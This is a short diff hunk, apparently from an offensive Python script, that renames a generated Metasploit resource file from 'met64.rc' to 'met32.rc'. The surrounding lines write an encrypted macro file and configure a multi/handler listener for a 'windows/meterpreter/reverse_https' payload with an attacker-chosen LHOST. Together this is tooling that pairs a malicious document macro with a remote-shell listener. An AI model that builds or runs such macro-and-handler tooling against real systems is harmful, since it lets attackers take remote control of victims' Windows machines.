@@ -54,7 +54,7 @@ with open("macro_encrypted.txt", "w") as f:
     f.write(macro_content)
 
 # Create a Metasploit resource file for handling incoming connections
-with open("met64.rc", "w") as f:
+with open("met32.rc", "w") as f:
     f.write(f"use exploit/multi/handler\n")
     f.write(f"set payload windows/meterpreter/reverse_https\n")
     f.write(f"set LHOST {args.LHOST}\n")
